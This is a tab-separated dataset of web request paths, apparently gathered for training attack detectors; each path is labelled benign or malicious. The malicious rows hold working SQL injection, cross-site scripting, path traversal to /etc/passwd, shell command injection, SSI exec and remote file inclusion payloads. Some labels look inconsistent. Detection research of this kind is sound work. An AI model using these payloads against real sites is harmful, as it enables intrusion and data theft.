request	label
/ string / strings / parameters = 3953 	0
/ javascript / mailman . as 	0
/ string / modo = entrar & login = k / lashins & pwd = preconizac ! in & remember = off & b1 = entrar 	1
"/ hjdzm96v . do ?  < script > document . cookie =  "" testbyqe = 7474 ;  ""  <  / script > "	1
"/ string / strings / parameters = -8258 ""  ""  )  )  as swjp where 2681 = 2681 union all select 2681 , 2681 , 2681 , 2681 , 2681 , 2681 -- "	1
/ cgi-bin / index . php ? site =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ examples / jsp / cal / sources / functions . php ? root_path =  / etc / passwd \ x00 	1
"/ string / strings / parameters = ""  | echo cctrqp $  (  ( 48 + 16 )  )  $  ( echo cctrqp ) cctrqp ' "	1
/ javascript / war . csv 	0
"/ string / strings / parameters = 1 %  ""  ""  )  and 8594 =  ( select 8594 from pg_sleep ( 5 )  )  -- "	1
/ string / id = 3 /  & nombre = jamn + ibrico & precio = 100 & cantidad = 41 & b1 = aadir + al + carrito 	1
"/ string / strings / parameters = ""  |  | echo qdyned $  (  ( 79 + 86 )  )  $  ( echo qdyned ) qdyned /  / "	1
/ sspybuddy / 	0
/ template / default / test / header . php ? root_path = xxpathxx ? cmd = ls 	1
"/ string / strings / parameters = < maction actiontype =  "" statusline ""  xlink : href =  "" javascript : alert ( 3 )  ""  > clickme < mtext > http :  /  / http :  /  / google . com <  / mtext >  <  / maction > "	1
"/ top . php ? stuff =  ""  & ping \ x0c-w \ x0c9000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 & rem \ x0c "	1
/ string / strings / parameters = navaescurial 	0
/ string / strings / parameters = 6449111559125327 	0
/ searchtop / 	0
/ string / strings / parameters = 1 )  as drgs where 1989 = 1989 order by 1 -- 	1
/ rxpharmacy / 	0
/ pub_06 / 	0
"/ string / strings / parameters = < x : script xmlns : x =  "" http :  /  / www . w3 . org / 1999 / xhtml ""  > alert ( 1 )  ;  <  / x : script > "	1
/ string / id = 2 & nombre = queso + manchego & precio = 100 /  & cantidad = 28 & b1 = aadir + al + carrito 	1
/ kabili / 	0
/ string / strings / parameters = polux ,  19 	0
/ javascript / subscriber . config 	0
/ javascript / setting . exe 	1
/ string / strings / parameters = < script for = _ event = onerror (  )  > confirm (  /  @ ma1 /  )  <  / script >  < img id = _ src =  > 	1
/ string / strings / parameters = ;  str =  $  ( echo gfxuis )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  # 	1
/ lessig-qa / 	0
/ string / strings / parameters = 1 )  where 9683 = 9683 ; select  ( case when  ( 1082 = 6755 )  then 1082 else 1082 *  ( select 1082 from mysql . db )  end )  # 	1
/ javascript / hipaa . vb 	0
/ string / strings / parameters = 1 )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  ) 	1
/ smg_smxcfg30 . exe ? vcc = 3560121183d3 	1
/ 14961436 / 	0
/ javascript / chris . ora 	0
/ national lampoon ' s christmas vaction / 	1
/ string / strings / parameters = aldealengua de pedraza 	0
/ cat_botanical / 	0
/ string / strings / parameters = 10332 	0
/ o35zot2r . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = taboada 	0
/ string / modo = registro & login = mitsui & password = d2s3o1nil2ar & nombre = tea & apellidos = cabrera + noguera & email = holzer-hammersley4 @ discon . in & dni = 7645b6096bw & direccion = guadamacil ,  + 198 ,  +  & ciudad = torrejoncillo & cp = 08779 & provincia = teruel & ntc = 4706372444418662 & b1 = registrar 	1
/ string / strings / parameters = 1 '  )  waitfor delay  ' 0 : 0 : 5 '  -- 	1
/ string / strings / parameters = corvera de asturias 	0
/ string / strings / parameters = vital 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' cclo '  from dual where 6823 = 6823 and 9198 = 9198 -- 	1
"/ zv8tv7h8 . html ?  < script > document . cookie =  "" testcqwz = 9752 ;  ""  <  / script > "	1
/ 146907 / 	0
/ calendar . php ? year =  < script > alert ( document . cookie )  ;  <  / script >  & month = 03 & day = 05 	1
/ search . pl ? form =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ bbslog / 	0
/ passwordrequest / 	0
/ string / strings / parameters = order by 12 -- 	1
/ javascript / storage . o 	0
/ buyahome / 	0
/ ntrust / 	0
/ rcheng0608 / 	0
/ legacy_experiment / 	0
/ subsilver_russian / 	0
/ 40001457 / 	0
/ string / strings / parameters = calle la fuente 116 2 ? e 	0
/ msg326684 / 	0
/ mimg-6tfmye / 	0
/ javascript / component . ini 	0
/ string / strings / parameters = 9061531800144737 	0
/ string / strings / parameters = 83817692b 	0
/ awstats / awstats . pl ? migrate =  | echo ; chmod 777  / tmp / jbqahurnly . sh ; echo | awstats912357 . txt 	1
/ lsl6-wt / 	0
/ string / errormsg =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -- 	1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo uftnka )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  # 	1
/ string / strings / parameters = 1 '  )  as scnn where 9274 = 9274 ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  -- 	1
/ cgi-915 / ustorekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ 010108 / 	0
/ infoadvice / 	0
/ claw_foot-wide / 	0
/ 631379651 / 	0
/ string / strings / parameters = 1 '  where 7464 = 7464 and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  # 	1
/ 443120 / 	0
/ scripts / app_and_readme / navigator / index . php ? page = http :  /  / 192 . 168 . 202 . 96 : 8080 / vir0v3xfc ? 	1
/ eudoralight / 	0
"/ string / strings / parameters = 1 ""  ""  where 4161 = 4161 and 8148 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- "	1
/ picture 7-7 / 	0
/ v15021773 / 	0
/ saturn / 	0
/ string / strings / parameters = 1 , updatexml ( 2917 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 2917 = 2917 , 1 )  )  )  , 0x717a767a71 )  , 8295 ) 	1
/ string / strings / parameters = 2111805626623658 	0
/ javascript / access-log . trace 	0
"/ string / strings / parameters = 1 ""  ""  )  union all select null , null , null , null , null , null , null , null -- "	1
/ eg2u8pbv . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ fcgi-bin / htimage . exe / path / filename ? 2 , 2 	1
/ 3zzzzgranniesweboflife061112 / 	0
/ nm0244630 / 	0
/ string / strings / parameters = 1 and updatexml ( 3393 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 3393 = 3393 , 1 )  )  )  , 0x717a767a71 )  , 1161 ) 	1
/ 22da103ac8de60c58b0cc988b0815cf2 / 	0
/ 175872 / 	0
/ pagina_140 / 	0
/ string / modo = registro & login = soliman & password = 85r7a4c2 & nombre = shiirly & apellidos = margarit + gallardo & email = asther @ ringringrent . bj & dni = 718619a7p & direccion = navalafuente ,  + 42 +  & ciudad = santa + cruz + de + pinares & cp = 37510 & provincia = zaragoza & ntc = 6014094757095594 & b1 = registrar 	1
/ string / modo = registro & login = michiel & password = apolilladura & nombre = ken & apellidos = corts & email = rozsabegyi . kasker @ mirata . ls & dni = 70243797a & direccion = grupos + 1 + y + 2 + valladolid + 178 ,  +  & ciudad = robledollano & cp = 34309 & provincia = valladolid & ntc = 7375761313849079 & b1 = registrar 	0
"/ string / strings / parameters = 1 ""  ""  )  )  or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  (  (  ""  "" ampn ""  ""  like  ""  "" ampn "	1
/ ukerna_news4 / 	0
/ apollo_1440x1024 / 	0
/ string / strings / parameters = ;  str =  $  ( echo ytwfpg )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
/ sl-11775 / 	0
/ string / strings / parameters = 31594 	0
/ phpmyadmin / documentation . html ? phpmyadmin =  / etc / passwd 	1
/ watchman_v4 / 	0
/ 380660 / 	0
/ string / strings / parameters = pertusa boladera 	0
/ regdata / 	0
/  '  .  $ _server [  ' php_self '  ]  .  '  ? act = img & img = delete 	1
/ string / strings / parameters = cotner 	0
/ javascript / smiles . sfish 	0
/ scripts / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331908817 '  )  <  / script > 	1
/ string / strings / parameters = echo nwxhah $  (  ( 8 + 91 )  )  $  ( echo nwxhah ) nwxhah \  \ 	1
/ javascript / tuscany . yml 	0
/ 24793593 / 	0
/ dachaigh / 	0
/ string / strings / parameters = 78370849m 	0
/ string / strings / parameters = 70p89c9cion958 	0
"/ top . php ? stuff =  "" del \ x0cq81327195 & rem \ x0c "	1
"/ string / strings / parameters = 1 ""  ""  union all select null , null , null , null , null , null # "	1
"/ string / strings / parameters = 1 ""  ""  )  )  )  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  (  (  (  ""  "" jgoq ""  ""  =  ""  "" jgoq "	1
"/ manager / awstatstotals . php ? sort =  ""  ]  . phpinfo (  )  . exit (  )  .  $ a [  "" "	1
/ fight - a small deadly space / 	0
/ n9xlumt5 . jsp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = belkis 	0
/ javascript / monitoring . cfg 	0
/ string / strings / parameters = 82402810c 	0
/ cgi-perl / gwweb . exe ? help = bad-request 	1
/ javascript / alerts . shtml 	0
/ string / strings / parameters = perales salmern 	0
/ news-64 / 	0
/ 9o6g5vkn . jspa ?  < script > cross_site_scripting . nasl <  / script > 	1
/ cgis / nph-showlogs . pl ? files =  .  .  /  .  .  /  & filter =  .  *  & linecnt = 500 & refresh = 0 & submit = go 	1
/ 19chemical / 	0
/ news-98 / 	0
/ string / strings / parameters = -8929 '  union all select 5324 , 5324 , 5324 , 5324 , 5324 , 5324 -- 	1
/ string / strings / parameters = |  | echo $ ifsbudoyz $  (  ( 31 + 53 )  )  $  ( echo $ ifsbudoyz ) budoyz ' 	1
/ string / strings / parameters = tanglao 	0
/ string / strings / parameters = &  & echo feylrm $  (  ( 81 + 59 )  )  $  ( echo feylrm ) feylrm ' 	1
/ article2067565 / 	0
/ phpmyadmin / documentation . html ? phpmyadmin = map47fckapd3c2j9d7svslcjakhdm1fs '  and sleep ( 4 )  =  ' 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ghgvor )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  # 	1
/ string / id = 3 & nombre = vino + rioja & precio = 100 & cantidad = 67 & b1 = aadir + al + carrito 	0
/ foot_03 / 	0
/ string / strings / parameters = 03520 	0
"/ dslpwt15 . exe ?  < script > document . cookie =  "" testtkio = 5454 ;  ""  <  / script > "	1
/ string / strings / parameters = somisett 	0
/ examples / jsp / cal / webdist . cgi ? distloc =  ; id 	1
/ string / strings / parameters = echo $ ifsrherrd $  (  ( 18 + 82 )  )  $  ( echo $ ifsrherrd ) rherrd ' 	1
/ european ' no ' tosoftwarepatentdirectiveleavesdoorsopentoprotectionofnewideas / 	1
/ javascript / opengts . csproj 	0
/ graham_holliday / 	0
/ javascript / todo . lib 	0
/ topic-announce_notread / 	0
/ phpmyadmin / man-cgi ? section = 0 & topic = ls ; id 	1
/ 98paper_vhm / 	0
"/ bn857frh . kspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ lsoix5h3 . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = )  )  )  )  waitfor delay  ' 0 : 0 : 20 '   /  * 	1
/ javascript / session . cs 	0
/ 043903 / 	0
/ guaifen / 	0
/ string / strings / parameters = <  / template > 	1
/ string / strings / parameters = ;  str =  $  ( echo pgaqqt )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / 	1
/ 000092378 / 	0
/ javascript / phpnuke . so 	0
/ installation-tool / 	0
/ 6199293 / 	0
/ b1q8bywu . exe ?  < script > cross_site_scripting . nasl <  / script > 	1
/ emba2006 / 	0
/ 195641_1 / 	0
"/ string / modo = entrar & login = hironaga & pwd = 130c & remember = on & b1 =  ""  >  <  !  --  # exec + cmd =  "" dir +  ""  --  >  < "	1
/ string / strings / parameters = 339a . redo 	0
/ randshop / index . php ? incl = xxpathxx ? 	1
/ string / strings / parameters = san clemente 2 	0
/ javascript / sys . lst 	0
/ javascript / submissions . zip 	0
/ 189257 / 	0
/ string / errormsg = credenciales + incorrectasand + 1 = 1 	1
/ string / strings / parameters = dip3o2gar 	0
/ javascript / sfish . pfx 	0
/ string / strings / parameters = 9385780627956523 	0
/ 003671 / 	0
"/ string / strings / parameters = 1 ""  ""  )  ; if ( 3831 = 9321 )  select 3831 else drop function ybru -- "	1
/ string / strings / parameters = vlentina 	0
/ examples / jsp / cal / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1645029612 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
/ a1138493 / 	0
/ index_pliki / 	0
/ 314879825_dd6ae5682f / 	0
/ 20020904-4 / 	0
/ cajamurcia_en / 	0
/ javascript / crack . php 	0
/ modsspecial-issue / 	0
/ string / strings / parameters = duesaiges 	0
/ _xuzlr7swn95 . pl 	0
/ javascript /  . passwd . stackdump 	1
/ v15026580 / 	0
/ original jukebox hits 1-4 / 	0
/ theme / test3 . php ? root = xxpathxx 	1
/ string / strings / parameters = woodburn @ vinavilano . hr 	0
/ keyoffcity / 	0
/ javascript / del . exe 	1
/ examples / jsp / jsp2 / jspx / ion-p . exe ? page = c :  \  \ winnt \  \ win . ini 	1
"/ u8yiqilu . jsp ?  < script > document . cookie =  "" testswjp = 6010 ;  ""  <  / script > "	1
/ calendar1 / 	0
/ string / strings / parameters = 1 '  )  )  )  or 7552 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  and  (  (  (  ' iaud '  =  ' iaud 	1
/ javascript / digg . jpg 	0
"/ string / strings / parameters = < xss style =  "" xss : expression ( javascript : alert ( 1 )  )  ""  > "	1
"/ string / strings / parameters = '  ;  str =  $  ( echo ueoozq )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ string / strings / parameters = calle antigua calle de la mar ,  31 ,  7 ? d 	0
/ wg1_test / 	0
"/ phpmyadmin / documentation . html ? phpmyadmin =  ""  >  < script  >  alert ( 201 )  ;   <  / script  > "	1
/ string / strings / parameters = pl .  de belen 153 ,  6 ? c 	0
/ jacquesbio / 	0
/ string / strings / parameters = perla 	0
/ string / strings / parameters = 1 and 3754 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  #  sipo 	1
"/ string / strings / parameters = 1 ""  ""  where 7022 = 7022 ; select  ( case when  ( 7822 = 4430 )  then 7822 else 1 /  ( select 0 )  end )  -- "	1
/ hightlight1 / 	0
/ blondie - plastic letters / 	0
/ string / strings / parameters = 50582 	0
/ top . php ? stuff =  | ping ; -w ; 9000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ; 	1
/ 000087931 / 	0
/ string / strings / parameters = | echo $ ifspynqqn $  (  ( 22 + 41 )  )  $  ( echo $ ifspynqqn ) pynqqn \ 	1
/ 049565 / 	0
"/ n1afe1y6 . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / nsf . js 	0
/ december26 / 	0
/ string / strings / parameters = 1 )  )  as klmm where 3107 = 3107 ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  -- 	1
/ string / strings / parameters = maria 	0
/ string / strings / parameters = + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null , null , null )   /  * 	1
/ string / strings / parameters = 1 '  ; select pg_sleep ( 5 )  and  ' qfaz '  like  ' qfaz 	1
/ thelars / 	0
/ string / strings / parameters = marracos 	0
/ sonstiges / 	0
/ news_medicare / 	0
/ javascript / flash . exe 	1
/ javascript / msadm . test 	0
/ string / strings / parameters = 5255016250924292 	0
/ string / strings / parameters = muga sirera 	0
"/ vhzmaia2 . mscgi ?  < script > document . cookie =  "" testkogj = 3979 ;  ""  <  / script > "	1
/ string / strings / parameters = oti sineiro 	0
/ string / strings / parameters = 1 or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  #  msrb 	1
/ string / modo = registro & login = mombourq & password = decusada & nombre = vi * n , k * a & apellidos = charbonnier + sisneros & email = bervil-berkel @ boda-barata . sn & dni = 31182783g & direccion = escritora + luciana + narvaez + 67 + 10 ? a & ciudad = albox & cp = 44620 & provincia = len & ntc = 6075270665324595 & b1 = registrar 	1
/ pr010006 / 	0
"/ string / id = 1 & nombre = queso + manchego & precio = 39 & cantidad = 59 & b1 =  <  !  --  # exec + cmd =  "" ls +  /  ""  --  > "	1
"/ main . php ? stuff =  ""  | ping , -w , 9000 , -n , 1 , 1 . 2 . 3 . 4 | rem , "	1
/ string / strings / parameters = snips 	0
/ string / strings / parameters = '  ) print (  ` echo qtjekd \ necho  $  (  ( 90 + 98 )  )  \ necho qtjekd \ necho qtjekd `  )  ;  .  ' qtjekd 	1
/ paulsoth / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fokdal )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ string / strings / parameters = punsly-giskes @ botilleria . com . ni 	0
/ 322395498884 / 	0
"/ jackrabbit / search . jsp ? q =  %  ""  < script > alert ( 1331904373 )  <  / script > "	1
/ string / strings / parameters = -4915 '  union all select 1928 , 1928 , 1928 , 1928 # 	1
/ string / modo = registro & login = mathieso & password = pesantez & nombre = trinidad & apellidos = mc ' morral + obrist & email = jolley @ decoaching . na & dni = 50535908d & direccion = azorin + 35 + 1b & ciudad = padiernos & cp = 25613 & provincia = sevilla & ntc = 8120300504791286 & b1 = registrar 	0
/ 165424 / 	0
/ setup_isopen / 	0
/ 3918-wbgstorage_reviews / 	0
/ string / strings / parameters = �? >  <  < script > alert ( document . cookie )  ;  /  /  <  <  / script > 	1
/ javascript / 1995 / 	0
/ string / modo = entrar & login = c /  ? a , ry & pwd = 0ara7s5o & remember = on & b1 = entrar 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' xyrk '  from dual where 9844 = 9844 and 9254 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  -- 	1
"/  ?  < script > document . cookie =  "" testexuu = 5340 ;  ""  <  / script > "	1
/ brief_ibm / 	0
/ brainwash / 	0
/ string / modo = registro & login = siham & password = enatametn ! e & nombre = cesrio & apellidos = castany + bigorra & email = mangini @ cubiertoscbb . an & dni = 93029703q & direccion = calle + rio + guadajira + 182 + 7-h & ciudad = codosera ,  + la & cp = 22314 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & provincia = salamanca & ntc = 9377074508770290 & b1 = registrar 	1
/ string / strings / parameters = safaa6 	0
/ javascript / presentations . bin 	0
/ manager / sawmillcl . exe ? ho +  { complete_version } 	1
"/ string / strings / parameters = '  ; echo wijqld $  (  ( 58 + 39 )  )  $  ( echo wijqld ) wijqld "" "	1
/ burkina / 	0
/ string / id = 2 & nombre = vino + rioja & precio = 100 & cantidad = 75 & b1 = aadir + al + carrito 	0
/ script_path / installation / index . php ? mosconfig_absolute_path =  @ rfiurl ? mosconfig_absolute_path =  @ rfiurl ? 	1
/ string / strings / parameters = 02629071x 	0
/ 2566imagecurrentnewsvers2 / 	0
/ 121435 / 	0
/ stoa - urthona / 	0
/ examples / jsp / sessions / k / home ? dir =  /  & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd & lang = kor 	1
/ string / modo = registro & login = shaibal & password =  . 11ne5o & nombre = huari & apellidos = mc ' morral + obrist & email = askam @ maxtienda . er & dni = 91436910l & direccion = chato + de + la + isla ,  + 50 + 10-g & ciudad = lezama & cp = 47620 & provincia = cceres & ntc = 9056484904037520 & b1 = registrar 	0
/ forbetter / 	0
/ string / strings / parameters = aldeaseca 	0
/ string / strings / parameters = ;  str =  $  ( echo qiikmd )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | 	1
"/ 82q7ywa8 . nsf ?  < script > document . cookie =  "" testpwew = 1315 ;  ""  <  / script > "	1
"/ uc3w3bdi . mscgi ?  < script > document . cookie =  "" testxllt = 9940 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 '  +  ( select gthp where 7311 = 7311 or sleep ( 5 )  # 	1
/ niet1528704951 . jsp 	0
/ creditanddebt / 	0
/ string / strings / parameters = 1 )  )  ; select benchmark ( 5000000 , md5 ( 0x714e4153 )  )  # 	1
/ string / strings / parameters = 1 '  )  or sleep ( 5 )  # 	1
"/ azcrfs8d . pl ?  < meta http-equiv = set-cookie content =  "" testjpdr = 9205 ""  > "	1
/ javascript / vote . asmx 	0
/ javascript / caller . pdf 	0
/ 1067708123263 / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo gzngde )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
/ string / strings / parameters = < script > referenceerror . prototype . __definegetter__ (  ' name '  ,  function (  )  { alert ( 1 )  }  )  , x <  / script > 	1
/ script / _conf / core / common-tpl-vars . php ? confdir = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ? 	1
/ string / strings / parameters = 027eja 	0
/ pdalok_details / 	0
/ cborgman / 	0
/ string / strings / parameters = campos del paraso 	0
/ prezzi_servizi-immobiliari / 	0
/ string / modo = insertar & precio = 5949 & b1 =  '  + and +  ' 1 '  =  ' 1 	1
/ string / strings / parameters = | echo ultuwd $  (  ( 51 + 75 )  )  $  ( echo ultuwd ) ultuwd 	1
/ mzcyotgx / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- "	1
/ 176294 / 	0
/ e32001 / 	0
/ forum / search . php ? repertorylevel = xxpathxx ? 	1
/ recordings / menu_dx . php ? site_path =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ javascript / document . 7z 	1
/ string / strings / parameters = 64079837c 	0
"/ q703m78q . nsf ?  < script > document . cookie =  "" testvowq = 604 ;  ""  <  / script > "	1
/ string / strings / parameters = silde 	0
/ string / modo = registro & login = aula & password = mocej * n & nombre = masashi & apellidos = sedo + kohls & email = mateos . thatcher @ hojainformativas . com . af & dni = 33245427p & direccion = etreros + 8 + 13a & ciudad = sant + jaume + de + frontany & cp = 33001 & provincia = segovia & ntc = 7713842274771043 & b1 = registrar 	0
/ don3 / applications / frontpage . don3app / frontpage . php ? app_path = xxpathxx ? 	1
/ facility1 / 	0
/ string / strings / parameters = 100 	0
/ fisamedadv9506 / 	0
/ javascript / inbound . stackdump 	0
/ string / strings / parameters = mio odena 	0
/ string / strings / parameters = 1 where 8398 = 8398 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 -- 	1
/ b000gl7ida / 	0
/ string / strings / parameters = maestro de burgos ,  199 	0
"/ wps / wcm / webinterface / login / login . jsp ?  ""  >  < script > alert (  "" ibm_login_qs_xss . nasl-1331919000 ""  )  <  / script > "	1
/ 990402 / 	0
/ mt_flag / 	0
/ 000114113 / 	0
/ cioleft / 	0
"/ string / strings / parameters = |  | echo tedjvc $  (  ( 96 + 45 )  )  $  ( echo tedjvc ) tedjvc "" "	1
/ list_reviews / 	0
/ help . php ? q =  '  ; rm q19585815  # 	1
/ pythonwebplugin / 	0
/ string / strings / parameters = abs hosta 	0
/ string / modo = entrar & login = chavis & pwd = desnarigada & remember = on & b1 = entrar 	0
/ string / strings / parameters = mccollum 	0
/ string / strings / parameters = 1 '  )  )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  and  (  (  ' oxvd '  like  ' oxvd 	1
/ q_20406306 / 	0
/ string / strings / parameters = 05150 	0
/ over 400 clan and gaming league themes and scripts / 	1
/ apollo11customs / 	0
/ 000063928 / 	0
"/ string / strings / parameters = ""  < xml id =  ""  "" xss ""  ""  >  < i >  < b >  < img src =  ""  "" javas <  !  --   --  > cript : alert (  ' xss '  )  ""  ""  >  <  / b >  <  / i >  <  / xml >  < span datasrc =  ""  ""  # xss ""  ""  datafld =  ""  "" b ""  ""  dataformatas =  ""  "" html ""  ""  >  <  / span >  <  / c >  <  / x >  <  / xml >  < span datasrc =  # i datafld = c dataformatas = html >  <  / span >  "" "	1
/ podhale-sport / 	0
/ search /  ? sectionidoverride = 1 & searchtext =  < script > alert ( document . cookie )  ;  <  / script > 	1
/ scripts / forum . php ? id_article = 1 & id_forum = -1 /  *  *  / union /  *  *  / select 1313328975 -- 	1
/ acyclovir_200mg / 	0
/ 110601 / 	0
/ sw / lib_user / user . php ? doc_directory = http :  /  / cirt . net / rfiinc . txt ?  ? 	0
/ string / strings / parameters = vai @ sexplorador . mk 	0
/ string / id = 2 & nombre = jamn + ibrico & precio = 100any ?   set-cookie :  + tamper = 1041264011025374727   & cantidad = 47 & b1 = aadir + al + carrito 	1
/ javascript / lock . error 	0
/ 003588 / 	0
/ 294781 / 	0
/ string / strings / parameters = mascaro-cimino @ 3horas . dk 	0
/ cacti / index . php ? module = topics & func = view & topicid = -1 union select null , null ,  ' mdpro_topicid_sql_injection . nasl-1331905123 '  , null , null , null , null  -- 	1
"/ en-us / 9kr0ih0v . php3 ?  < script > document . cookie =  "" testzgnm = 1183 ;  ""  <  / script > "	1
/ string / modo = registro & login = paterson & password = e72i4 & nombre = yarela & apellidos = vera & email = dudas @ google-movil . np & dni = 67405434r & direccion = cardenal + mendoza + s / n ,  + 7 ? h & ciudad = santa + cruz + de + la + salceda & cp = 44340 & provincia = toledo & ntc = 5546391843457163 & b1 = registrar 	0
/ cgi-local / ustorekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
